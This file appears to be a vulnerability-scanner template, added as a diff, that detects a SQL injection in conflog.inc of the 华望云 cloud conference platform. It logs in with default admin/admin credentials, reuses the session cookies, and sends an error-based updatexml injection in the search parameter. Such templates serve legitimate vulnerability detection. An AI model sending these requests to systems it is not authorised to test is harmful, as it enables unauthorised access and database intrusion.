@@ -1,0 +1,58 @@
+id: poc-yaml-hwactive-conflog-inc-sqli
+info:
+  name: 华望云会议管理平台 conflog.inc SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template identifies a SQL injection vulnerability in conflog.inc of the 华望云会议管理平台.
+
+variables:
+  uid: ""
+  cookie: ""
+
+http:
+  - raw:
+      - |
+        POST /ajax/userlogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        userNameCopy=admin&userName=admin&passWordCopy=admin&passWord=21232f297a57a5a743894a0e4a801fc3
+
+    extractors:
+      - type: regex
+        name: uid
+        part: header
+        regex:
+          - "uid=(.*?);"
+        internal: true
+      - type: regex
+        name: cookie
+        part: header
+        regex:
+          - "JSESSIONID=(.*?);"
+        internal: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body, '\"success\":true')"
+
+  - raw:
+      - |
+        GET /page/conflog.inc?search=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+md5(1))),1))+and+'%25%25'+like+'&params[]=confName&params[]=confId&selectTime=1 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: uid={{uid}}; JSESSIONID={{cookie}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "XPATH syntax error"
+          - "java.sql.SQLException"
+          - "c4ca4238a0b923820dcc509a6f75849b"
+        part: body
